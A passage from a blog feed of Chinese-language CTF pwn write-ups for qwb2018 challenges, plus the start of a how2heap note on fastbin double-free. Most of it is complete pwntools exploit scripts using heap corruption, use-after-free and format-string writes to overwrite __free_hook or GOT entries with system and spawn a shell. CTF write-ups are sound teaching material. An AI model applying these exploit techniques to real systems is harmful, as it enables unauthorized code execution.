class="built_in">len</span>(string)==<span class="number">0x20</span>):</span><br><span class="line">        sa(<span class="string">&quot;Now, you can input your test string:&quot;</span>,string)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Now, you can input your test string:&quot;</span>,string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please give me the index of the string:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,oldchar,newchar</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please give me the index of the string:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Which char do you want to edit:&quot;</span>,oldchar)</span><br><span class="line">    sla(<span class="string">&quot;What do you want to edit it into:&quot;</span>,newchar)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please give me the index of the string:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">num</span>):</span></span><br><span class="line">    choose(<span class="number">12580</span>)</span><br><span class="line">    sla(<span class="string">&quot;Do you want to use one?(Y/N)&quot;</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Here are 5 strings to be tested. Which one do you want to test?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">backdoor(<span class="number">0x80000000</span>)</span><br><span class="line">ru(<span class="string">&quot;The string:\n&quot;</span>)</span><br><span class="line">elf_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x2030c0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x12</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;\x04&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebca0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#0x13</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0x13</span>)</span><br><span class="line">ru(<span class="string">&quot;The string is:\n&quot;</span>)</span><br><span class="line">heap=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">        edit(<span class="number">7</span>+i,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">7</span>+i,<span class="string">&#x27;\x41&#x27;</span>,<span class="string">&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x62</span>+i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">9</span>,<span class="built_in">chr</span>(<span class="number">0x71</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;\x6a&#x27;</span>,<span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">7</span>+i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x61</span>+i))</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x61</span>+<span class="number">0x10</span>+i))</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;\x41&#x27;</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">6</span>,<span class="built_in">chr</span>(<span class="number">0x77</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heaplist=elf_base+<span class="number">0x203060</span></span><br><span class="line">target=heaplist+<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x62</span>+i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x81</span>-i),<span class="built_in">chr</span>((((target-<span class="number">0x10</span>)&lt;&lt;<span class="number">8</span>*i)&amp;<span class="number">0xff00000000000000</span>)&gt;&gt;<span class="number">7</span>*<span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x79</span>-i),<span class="built_in">chr</span>((((target-<span class="number">0x18</span>)&lt;&lt;<span class="number">8</span>*i)&amp;<span class="number">0xff00000000000000</span>)&gt;&gt;<span class="number">7</span>*<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x71</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;\x6a&#x27;</span>,<span class="string">&#x27;\xb1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x69</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(target)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>((free_hook&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>((system&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;/bin/sh\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="qwb2018-gamebox"><a href="#qwb2018-gamebox" class="headerlink" title="qwb2018_gamebox"></a>qwb2018_gamebox</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>glibc 版本为 2.27，除了仅开启 Partial RELRO 其余保护全开。</p>
<p>程序包含4个功能：</p>
<ul>
<li>Play: 每次可以申请一个固定大小的 chunk</li>
<li>Show: 打印 chunk</li>
<li>Delete: 删除 chunk</li>
<li>Change: 修改 chunk 中的内容</li>
</ul>
<p>不过，调用这些功能时，需要输入不同 chunk 对应的 cookie。cookie 是通过 rand 获取的，并且由于种子值是默认的，所以很容易获取。</p>
<h4 id="漏洞与利用-1"><a href="#漏洞与利用-1" class="headerlink" title="漏洞与利用"></a>漏洞与利用</h4><ul>
<li>Show 功能中存在格式化字符串功能，泄露和修改都用这个</li>
</ul>
<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><ul>
<li>先利用 Show 中的格式化字符串漏洞，泄露栈上地址、efl_base、libc 版本</li>
<li>同理修改栈上内容，由于输入内容在堆上，所以得<a href="http://blog.rabb1t.xyz/2022/03/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/#%E5%88%A9%E7%94%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E9%93%BE%E5%BC%8F%E7%BB%93%E6%9E%84%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E6%94%B9%E5%86%99">利用 rbp_chain 来实现修改</a>，将 __free_hook 修改为 system。</li>
</ul>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>将 cookie 放入 cookies 文件中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./GameBox.dms&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28564</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./GameBox.dms&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span> x:gdb.attach(io,gdbscript=x)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;(E)xit&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">cookies=[]</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line=f.readline()</span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        cookies.append(line[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,name</span>):</span></span><br><span class="line">    choose(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Come on boy!Guess what I write:&quot;</span>,cookies[idx])</span><br><span class="line">    sla(<span class="string">&quot;Input your name length:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> size!=<span class="built_in">len</span>(name):</span><br><span class="line">        sla(<span class="string">&quot;Input your name:&quot;</span>,name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sa(<span class="string">&quot;Input your name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Input Cookie:&quot;</span>,cookies[idx])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    choose(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Input Cookie:&quot;</span>,cookies[idx])</span><br><span class="line">    sa(<span class="string">&quot;input your new name(no longer than old!):&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    choose(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;$p%&#123;&#125;$p%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(<span class="number">8</span>,<span class="number">17</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">gdbcmd=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># debug(gdbcmd)</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1874</span></span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">231</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((stack_addr+<span class="number">8</span>)&amp;<span class="number">0xffff</span>,<span class="number">15</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>])&amp;<span class="number">0xffff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((stack_addr+<span class="number">8</span>+<span class="number">2</span>)&amp;<span class="number">0xffff</span>,<span class="number">15</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>]&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>(libc[<span class="string">&#x27;system&#x27;</span>]&amp;<span class="number">0xffff</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((stack_addr+<span class="number">8</span>)&amp;<span class="number">0xffff</span>,<span class="number">15</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">2</span>)&amp;<span class="number">0xff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;system&#x27;</span>]&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">4</span>)&amp;<span class="number">0xff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;system&#x27;</span>]&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(gdbcmd)</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="qwb2018-silent"><a href="#qwb2018-silent" class="headerlink" title="qwb2018_silent"></a>qwb2018_silent</h2><h2 id="qwb2018-silent2"><a href="#qwb2018-silent2" class="headerlink" title="qwb2018_silent2"></a>qwb2018_silent2</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>glibc 版本为 2.27，仅开启 Partial RELRO，且未开启 PIE。</p>
<p>程序3个功能：</p>
<ul>
<li>add: 申请一个 chunk，大小为 0x10 或大于 0x7f</li>
<li>remove: 删除一个 chunk</li>
<li>edit: 修改 chunk 内容，大小由 strlen 确定</li>
</ul>
<h4 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h4><ul>
<li>remove 功能中存在 uaf，可以利用来修改 tcache_chain</li>
</ul>
<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>将 free_got 放入 tcache_chain 中，然后修改为 system 即可。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./silent2&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25196</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./silent2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=filename</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sl(<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>how2heap</title>
    <url>/2022/04/11/how2heap/</url>
    <content><![CDATA[<p>待续</p>
<span id="more"></span>

<h1 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h1><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>该demo通过分别释放不同的两个大小相等的堆，向我们展示了fastbin attack中的double_free。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>fastchunk被free之后会加入fastbin中，且在加入时会检查main_arena直接指向的地址(即链表头部)是否为当前释放的块。</p>
<p>因此当我们当前释放的堆不是最后释放时，无论是否被释放过都被释放。因此能够进行double-free，将该地址多次放入一条链中。</p>
